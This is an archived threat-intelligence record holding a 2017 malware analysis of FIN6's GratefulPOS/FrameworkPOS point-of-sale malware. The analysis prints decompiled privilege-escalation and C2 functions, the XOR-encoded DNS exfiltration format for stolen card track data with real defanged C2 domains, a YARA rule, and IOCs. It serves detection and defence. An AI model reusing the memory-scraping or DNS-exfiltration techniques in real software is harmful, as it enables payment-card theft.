{
    "id": "0f9cb26a-81f8-44ad-b013-0b79b301533d",
    "created_at": "2023-01-12T15:03:51.492806Z",
    "updated_at": "2025-03-27T02:15:13.904356Z",
    "deleted_at": null,
    "sha1_hash": "51b9893be9dfad6be95dd41ff998df49c732731e",
    "title": "2017-12-13 - Update- Let's Learn- Reversing FIN6 -GratefulPOS- aka -FrameworkPOS- Point-of-Sale Malware in-Depth",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:26Z",
    "file_modification_date": "2022-05-28T04:12:26Z",
    "file_size": 685196,
    "plain_text": "# Update: Let's Learn: Reversing FIN6 \"GratefulPOS\" aka \"FrameworkPOS\" Point-of-Sale Malware in-Depth\n\n**vkremez.com/2017/12/lets-learn-reversing-grateful-point-of.html**\n\n**Goal: Reverse the latest Point-of-Sale (POS) malware dubbed \"GratefulPOS\" in-depth including some of the**\nnotable source code-level insights.\n\n**Source: RSA FirstWatch Blog**\n[\"GratefulPOS credit card stealing malware - just in time for the shopping season\"](https://community.rsa.com/community/products/netwitness/blog/2017/12/08/gratefulpos-credit-card-stealing-malware-just-in-time-for-the-shopping-season)\n\n**Malware Sample:** [67a53bd24ee8499fed79c8c368e05f7a](https://www.virustotal.com/#/file/81cea9fe7cfe36e9f0f53489411ec10ddd5780dc1813ab19d26d2b7724ff3b38/detection)\n\n**[Credit: @w1mp1k1ng](https://twitter.com/w1mp1k1ng/)**\n**POS Malware Brief:**\n\nPOS malware targets targets systems that run physical point-of-sale device and operates by inspecting\nthe process memory for data that matches the structure of credit card data (Track1 and Track2 data), such\nas the account number, expiration date, and other information stored on a card’s magnetic stripe. After the\ncards are first scanned, the personal account number (PAN) and accompanying data sit in the point-ofsale system’s memory unencrypted while the system determines where to send it for authorization.\n\n[Look Maa! It's zero-detection Point-of-Sales #POS](https://twitter.com/hashtag/POS?src=hash&ref_src=twsrc%5Etfw) [#malware we are calling #gratefulPOS just in time for](https://twitter.com/hashtag/malware?src=hash&ref_src=twsrc%5Etfw)\n[holiday shopping season! https://t.co/WpA6KCi3zu](https://t.co/WpA6KCi3zu)\n[— w1mp1 (@w1mp1k1ng) December 8, 2017](https://twitter.com/w1mp1k1ng/status/939226704312193024?ref_src=twsrc%5Etfw)\n\n**FrameworkPOS aka GratefulPOS Background:**\n\nMasked as the LogMein software, the GratefulPOS malware appears to have emerged during the fall 2017\nshopping season with low detection ratio according to some of the earliest detections displayed on\nVirusTotal. The first sample was upload in November 2017. Additionally, this malware appears to be\nrelated to the Framework POS malware, which was linked to some of the high-profile merchant\nbreaches in the past. All in all, the GratefulPOS malware appears to communicate via DNS with the\npurported \"grp1\" campaign identifier and contains debug Track 2 data presumably for testing purposes.\n\nDeep dive into the GratefulPOS malware:\n\nI. Malware Service Installation and Persistence\nII. Byte String Build and XOR Encoder with Key \"0AAh\"\nIII. Memory Scraping Debug Privilege\nIV. Client-Server Communications\nV. Logger File and Collector File Generation\nVI. Scraping Process Whitelisting\nVII. Memory Scraping Logic\nVIII. Luhn Algorithm\nX. Self-Deletion Process\nXI. Yara Signature\n**I. Malware Service Installation and Persistence**\nThe first thing that this GratefuPOS malware does is creates itself up as a service for persistence.\nThe malware masks itself as a legitimate-looking service titled “LogMeIn Hamachi Launcher” with the short\nname of “LogMeInHamachi”. For those unfamiliar, LogMeIn Hamachi is a \"virtual private network (VPN)\napplication that is capable of establishing direct links between computers that are behind NAT firewalls without\nrequiring reconfiguration (when the user's PC can be accessed directly without relays from the Internet/WAN\n\n\n-----\n\nside). Such VPN software is extremely popular amongst administrators and technicians who might need to\nremotely login to the point-of-sale card network to address IT administrative and network issues.\n\nThe malware control function contains the following four functions:\nstop\nstart\ninstall\nuninstall\nThe install function leverages usual OpenSCManagerA, CreateServiceA to create the service with the\ndescription \"Provides launch functionality for LogMeInHamachi services.\" Additionally, it creates a unique mutex\ntitled 'DLLLaunchasdf1'\n\n**II. XOR Byte String Build and XOR Obfuscation with Key \"0AAh\"**\nThroughout its execution, the malware builds some notable strings via xoring the byte section in the loop *\n(&byte_memory ++) ^= 0x4Dh (via sequence of mov, xor, shl, movsx, and shl calls) displaying the strings as\n\n\n-----\n\nfollows:\n4060320344370557=19022010000068600000\n\nns[.]a193-45-3-47-deploy-akamaitechnologies[.]com\n\nSeDebugPrivilege\n\n0.0.0.0\n\nrecv\n\nsend\nOftentimes, malware coders build string paths to bypass some static anti-virus detection.\nNotably, the GratefulPOS malware obfuscates its stolen data via the hardcoded XOR byte key to strings as\nfollows:\n*((_BYTE *)value + iter) ^= 0AAh\nand converts it into hexadecimals adding to snprintf API call. The hardcoded xor byte key used is \"0AAh.\"\nAdditionally, the malware checks the hardcoded string array while it XOR's the data. The XOR key function\nlocation is as follows:\n-------    -------Address    Function\n-------    -------.text:004030DB notice_write_func\n.text:00403847 memory_parser\n.text:00403873 memory_parser\n.text:004039DE memory_parser\n.text:00406C43 computer_name_gen\n**III. Memory Scraping Debug Privilege**\n\nThen, the POS malware tries to obtain \"SeDebugPrivilege\" access for memory parsing leveraging the\ncombination of GetCurrentProcess, OpenProcessToken, LookupPrivilegeValueA, and AdjustTokenPrivileges API\ncalls.\nint __cdecl sedebug_escalation(LPCSTR lpName)\n{\nHANDLE v1;\nint result;\nDWORD ReturnLength;\nHANDLE TokenHandle;\nstruct _TOKEN_PRIVILEGES NewState;\n\nmemset(&NewState, 0, 0x10u);         // GratefulPOS obtain SeDebugPrivilege\nNewState.PrivilegeCount = 1;\nv1 = GetCurrentProcess();\nif ( OpenProcessToken(v1, 0xF01FFu, &TokenHandle) )\n{\nif ( LookupPrivilegeValueA(0, lpName, (PLUID)NewState.Privileges) )\n{\nNewState.Privileges[0].Attributes = 2;\nif ( AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, &ReturnLength) )\n{\nCloseHandle(TokenHandle);\nresult = 1;\n\n\n-----\n\n}\nelse\n{\nCloseHandle(TokenHandle);\nresult = 0;\n}\n}\nelse\n{\nCloseHandle(TokenHandle);\nresult = 0;\n}\n}\nelse\n{\nresult = 0;\n}\nreturn result;\n}\n**IV. Client-Server Communications**\nThe malware proceeds to check if the SID using AllocateAndInitializeSid and EqualSid to see if it has\nsucceeded with the call. If the return call equals \"1,\" the malware copies and stores the string \"adm\" indicating\nadmin privileges. Otherwise, GratefulPOS copies and stores the string \"nadm\" indicating the absence of such\nprivileges.\n\n\n-----\n\nEventually, the malware uses this information as part of the ping.%s.%s.%s.%s storing it as string in the first\nargument to reach the server ns[.]a193-45-3-47-deploy-akamaitechnologies[.]com (GET /index.php HTTP/1.0,\nwherein the host username is generated via GetComputerNameA xor'ed with the byte key used \"0AAh\" and\nconverted into hexadecimals). All in all, the malware runs the server calls in a separate thread. The POS\nmalware then sleeps randomly for the period of between 2 hours and 3 hours (rand() % 3600000 + 7200000)\nbefore the next server call. GratefulPOS also adds the likely campaign identifier as “grp1” to the request when\nsending the data to the server. Notably, if the malware reads the value as \"cccc,\" it removes itself from the\nsystem. The malware collects both local computer name and its local IP.\nsigned int __cdecl get_http_resolve_func(int a1)\n{\nsigned int result;\nchar v2;\nint v3;\nint v4;\nint v5;\nint v6;\nint v7;\nint v8;\nint v9;\nint v10;\nchar v11;\nchar v12;\n\nv11 = 0;\nmemset(&v12, 0, 0x7FFu);\n**_snprintf(&v11, 2047u, \"%s.%s.%s.%s\", logmein_bid_value, computer_name, 'grp1', a1, &name);**\nv10 = 0;\nv6 = 0;\nmemset(&v2, 0, 0x20u);\nv3 = 0;\nv4 = 1;\nv5 = 17;\nv7 = call_c2((int)&v11, (int)\"http\", (int)&v2, (int)&v10);\nif ( v7 )\n{\nresult = -1;\n}\nelse\n{\nv8 = *(_DWORD *)(v10 + 24);\nv9 = *(_DWORD *)(v8 + 4);\nif ( v9 == 'cccc' )\n**self_delete_func();**\nfunc_6(v10);\nresult = 0;\n}\nreturn result;\n**V. Logger File and Collector File Generation**\nThe POS malware proceeds to open the file \"logmein[.]bid\" with read access privileges and read first 10 bytes. If\nit does not exit it will create a file \"logmein[.]bid\" with four two-digit random signed integers between 0 and 255\n\n\n-----\n\nin hexadecimals generated via the rand() % 255 command. This generated string becomes the exfiltration file\nmarker masked as a system \".dat\" file.\n**VI. Scraping Process Whitelisting**\nThen, the POS malware obtains a snapshot of current running processes via CreateToolhelp32Snapshot and\ncompares it against the whitelisted ones for memory scraping function. The whitelisted functions as follows:\nwininit.exe\n\nservices.exe\n\nsmss.exe\n\ncsrss.exe\n\nwinlogon.exe\n\nsched.exe\n\nlsass.exe\n\nsvchost.exe\n\nconhost.exe\n\nctfmon.exe\n\nspoolsv.exe\n\nSystem\n\ntaskmgr.exe\n\nexplorer.exe\n\nwmiprvse.exe\n\nmdm.exe\n\nchrome.exe\n\nChrome.exe\n\nRegSrvc.exe\n\nfirefox.exe\nThis is done to shorten memory scraping time looking for Track data by excluding known processes not\nassociated with possible point-of-sale software.\n**VII. Memory Scraping Logic**\nGratefulPOS proceeds to read process memory pages leveraging using VirtualQueryEx reading Buffer.State &\n0x1000 && Buffer.Protect & 0xCC at a time. The malware also compares if the process file path is at least 5\ncharacters long. Then, the POS malware scans memory regions via ReadProcessMemory API looking for Track\n1 and Track 2 data and writing and appending it to the \".dat\" file as \"tt1.%s.%s.%s.%s\" Track 1 data and\n\"tt2.%s.%s\" Track 2 data if the matched length is 140 and 60 characters, respectively. The malware also checks\nif it can reach the server and after several attempts it deletes the stolen data. Additionally, GratefulPOS appends\n\"notice\" to the same file to mark debugger output.\nThe observed structure of the submitted requests data is as follows:\n\n\n-----\n\n[HOST_ID].grp1.ping.[ADMIN].[LOCAL_IP].[LOCAL_USERNAME].ns[.]a193 45 3 47 deploy\nakamaitechnologies.com\n\n[HOST_ID].grp1.notice.[PROCESS_ATTACHED].ns[.]a193-45-3-47-deploy-akamaitechnologies.com\n\n[HOST_ID].grp1.tt1.[TRACK1_INFORMATION].ns[.]a193-45-3-47-deploy-akamaitechnologies.com\n\n[HOST_ID].grp1.tt2.[TRACK2_INFORMATION].ns[.]a193-45-3-47-deploy-akamaitechnologies.com\n**VIII. Luhn Algorithm**\n\nThe malware also validates the card information by running the Luhn algorithm for any purported track data that\ndoes not begin with digits “4” (VISA), “5” (Mastercard), “6” (Discover), “34\" (AMEX), “37” (AMEX), “36” (Diner’s\nClub), and “300-305” (Diner’s Club).\nThe Luhn function that verifies the validity of personal account number (PAN) is as follows:\nBOOL __cdecl Luhn_Check(char *a1)\n{\nsize_t v1;\nint v3;\nsigned int v4;\nsigned int v5;\nsize_t v6;\nint v7;\nint v8;\nint v9;\nint v10;\nint v11;\nint v12;\nint v13;\nint v14;\nint v15;\nint v16;\n\nv7 = 0;\nv8 = 2;\nv9 = 4;\nv10 = 6;\n\n\n-----\n\nv11 = 8;\nv12 = 1;\nv13 = 3;\nv14 = 5;\nv15 = 7;\nv16 = 9;\nv5 = 1;\nv4 = 0;\nv6 = strlen(a1);\nwhile ( 1 )\n{\nv1 = v6--;\nif ( !v1 )\nbreak;\nif ( v5 )\nv3 = a1[v6] - 48;\nelse\nv3 = *(&v7 + a1[v6] - 48);\nv4 += v3;\nv5 = v5 == 0;\n}\nreturn v4 % 10 == 0;\n}\n**X. Self-Deletion Process**\nThe malware deletes itself removing itself the RUN key registry key as \"\n\nLogMeIn Hamachi Launcher\" and deleting itself as \"logmeinlauncher[.]exe\" upon reading the instruction \"cccc.\"\n\n**XI. YARA RULE**\n**rule crime_win32_gratefulpos_trojan {**\nmeta:\ndescription = \"GratefulPOS malware variant\"\nauthor = \"@VK_Intel\"\nreference = \"Detects GratefulPOS\"\ndate = \"2017-12-10\"\n**strings:**\n$s0 = \"conhost.exe\" fullword ascii\n\n\n-----\n\n$s1 = del logmeinlauncher.exe fullword ascii\n$s2 = \"Chrome.exe\" fullword ascii\n$s3 = \"taskmgr.exe\" fullword ascii\n$s4 = \"firefox.exe\" fullword ascii\n$s5 = \"logmeinlauncher.exe stop\" fullword ascii\n$s6 = \"ping 1.1.1.1 -n 1 -w 3000 > nul\" fullword ascii\n$s7 = \"Ymscoree.dll\" fullword wide\n$s8 = \"LogMeInHamachi Process Launcher\" fullword ascii\n$s9 = \"sched.exe\" fullword ascii\n$s10 = \"wininit.exe\" fullword ascii\n$s11 = \"wmiprvse.exe\" fullword ascii\n$s12 = \"RegSrvc.exe\" fullword ascii\n$s13 = \"mdm.exe\" fullword ascii\n$s14 = \"GET /index.php HTTP/1.0\" fullword ascii\n$s15 = \"LogMeIn Hamachi Launcher\" fullword ascii\n$s16 = \"logmein.bid\" fullword ascii\n$s17 = \"del sd.bat\" fullword ascii\n$s18 = \"sd.bat\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 500KB and 10 of them\n}\n\n**Update (May 16, 2019); Some of the new FIN6 FrameworkPoS malware variants were spotted by**\n**[@malz_intel revealing that the group is still utilizes the 64-bit malware variant with two export](https://twitter.com/malz_intel)**\n**functions \"workerIntstance\" and \"debugPoint\".**\n**The malware variant creates a mutex \"Global.Ms.ThreadPooling.MyAppSingleInstance\" with the**\n**Russian language version section storing the stolen Track1/Track2 data in \"Temp\\memscrp.stp\" with**\n**\".stopped\" marker.**\n**The server naming convention is still \"ns.akamai1811[.]com\" via DNS exfiltration.**\n\n\n-----\n\n**The malware writes the bot ID to C:\\Microsoft\\HelpAssistant\\btid.dat.**\n**As usual, the FrameworkPoS malware forms the query with adding scraper card Track1 under \"tt1\"**\n**and Track2 under \"tt2\" prefixes.**\n\n**Notably, the FrameworkPoS still leverages hex with 0xAA byte XOR encoding for exfiltrated data with**\n**the ping request, for example, as follows (decoded):**\n```\n [LOCAL_IP];[USERNAME];[X64/X86];[HOSTNAME];[limited_privs|admin_privs];\n\n```\nNow, this malware also contains an altered \"greedier\" version of the Track1/Track2 scanner logic focusing less\non static card prefixes and service codes but for more any data that looks like Track1/Track2.\n\n**Update (December 21, 2017): Thanks for the feedback in the comment section, I've compiled all the IOCs in**\none table listing Framework/GratefuPOS malware hashes (in SHA1), campaign IDs, service names, and known\nnameserver C2s.\n\n\n-----\n\n**FRAMEWORK/GRATEFULPOS MALWARE**\n\n\n**CAMPAIGN**\n**ID** **SERVICE** **NS C2**\n\n\n3e7efa7ad5de8fe7698d993c968bc108ef0350d6 grp02 DllLaunch ns[.]a23-33-37-54-deployakamaitechnologies.[]com\n\n268f4b8f7c981b04d2d19d4102cdcca6f965d3f3 grp03 DllLaunch ns[.]a23-33-37-54-deployakamaitechnologies.[]com\n\n77bd272517a3c1abc8f5e07af3a5980becb3652e grp03 LogMeInServer ns[.]a23-33-37-54-deployakamaitechnologies.[]com\n\n1762b5583552a435528334ffc552b73699e477cb grp05 LogMeInServer ns[.]a23-33-37-54-deployakamaitechnologies.[]com\n\nd957e492e918ed200268e681907f4c7644b1a211 grp1 LogMeInHamachi ns[.]a193-45-3-47-deployakamaitechnologies[.]com\n\n2e7ca3676593674e9d75fb3efc73be62e378f5ce grp10 LogMeInServer ns[.]a23-33-37-54-deployakamaitechnologies.[]com\n\nc76c62981f3d6526d799dd93f61559915f09005e grp2 LogMeInHamachi ns[.]a193-45-3-47-deployakamaitechnologies[.]com\n\n2d9b601d09bc1e49c94b316263f96d6ee6e57c54 v1702 TrueTypeFontSvc ns[.]a193-108-94-56deployakamaitechnologies[.]com\n\n17b657174313e3e7ce84c030991a271b66eb0840 v1702 TrueTypeFontSvc ns[.]a193-108-94-56deployakamaitechnologies[.]com\n\n\n04595012daaaf75f0a72db87b76e9fd9401a7a40\n\n\nv1705 PnPH ns[.]a193-108-94-56deployakamaitechnologies[.]com\n\n\n0eb7ac6d2d99d702ecc8b86ff90b0aac 296bd6eb N/A (Dll) ns.akamai1811[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-12-13 - Update- Let's Learn- Reversing FIN6 -GratefulPOS- aka -FrameworkPOS- Point-of-Sale Malware in-Depth.pdf"
    ],
    "report_names": [
        "2017-12-13 - Update- Let's Learn- Reversing FIN6 -GratefulPOS- aka -FrameworkPOS- Point-of-Sale Malware in-Depth.pdf"
    ],
    "threat_actors": [
        {
            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
            "created_at": "2023-01-06T13:46:38.485884Z",
            "updated_at": "2025-03-27T02:00:02.845851Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "Camouflage Tempest",
                "MageCart Group 6",
                "G0037",
                "TA4557",
                "SKELETON SPIDER",
                "ITG08",
                "White Giant",
                "GOLD FRANKLIN",
                "ATK88"
            ],
            "source_name": "MISPGALAXY:FIN6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
            "created_at": "2022-10-25T16:07:23.61665Z",
            "updated_at": "2025-03-27T02:02:09.889471Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "ATK 88",
                "Camouflage Tempest",
                "FIN6",
                "Gold Franklin",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "TAG-CR2",
                "White Giant"
            ],
            "source_name": "ETDA:FIN6",
            "tools": [
                "AbaddonPOS",
                "Agentemis",
                "AmmyyRAT",
                "Anchor_DNS",
                "BlackPOS",
                "CmdSQL",
                "Cobalt Strike",
                "CobaltStrike",
                "FlawedAmmyy",
                "FrameworkPOS",
                "Grateful POS",
                "JSPSPY",
                "Kaptoxa",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LockerGoga",
                "MMon",
                "Magecart",
                "Meterpreter",
                "Mimikatz",
                "More_eggs",
                "NeverQuest",
                "POSWDS",
                "Reedum",
                "Ryuk",
                "SCRAPMINT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Terra Loader",
                "TerraStealer",
                "Vawtrak",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "cobeacon",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
            "created_at": "2024-06-19T02:03:08.052814Z",
            "updated_at": "2025-03-27T02:05:17.368029Z",
            "deleted_at": null,
            "main_name": "GOLD FRANKLIN",
            "aliases": [
                "ITG08 ",
                "MageCart Group 6 ",
                "Skeleton Spider ",
                "White Giant ",
                "FIN6 "
            ],
            "source_name": "Secureworks:GOLD FRANKLIN",
            "tools": [
                " Metasploit",
                " Meterpreter",
                " Mimikatz",
                " PowerSploit",
                " PowerUpSQL",
                " RemCom",
                "FrameWorkPOS"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
            "created_at": "2022-10-25T15:50:23.317961Z",
            "updated_at": "2025-03-27T02:00:55.440858Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "FIN6",
                "Magecart Group 6",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "Camouflage Tempest"
            ],
            "source_name": "MITRE:FIN6",
            "tools": [
                "FlawedAmmyy",
                "GrimAgent",
                "FrameworkPOS",
                "More_eggs",
                "Cobalt Strike",
                "Windows Credential Editor",
                "AdFind",
                "PsExec",
                "LockerGoga",
                "Ryuk",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535831,
    "ts_updated_at": 1743041713,
    "ts_creation_date": 1653711146,
    "ts_modification_date": 1653711146,
    "files": {
        "pdf": "https://archive.orkl.eu/51b9893be9dfad6be95dd41ff998df49c732731e.pdf",
        "text": "https://archive.orkl.eu/51b9893be9dfad6be95dd41ff998df49c732731e.txt",
        "img": "https://archive.orkl.eu/51b9893be9dfad6be95dd41ff998df49c732731e.jpg"
    }
}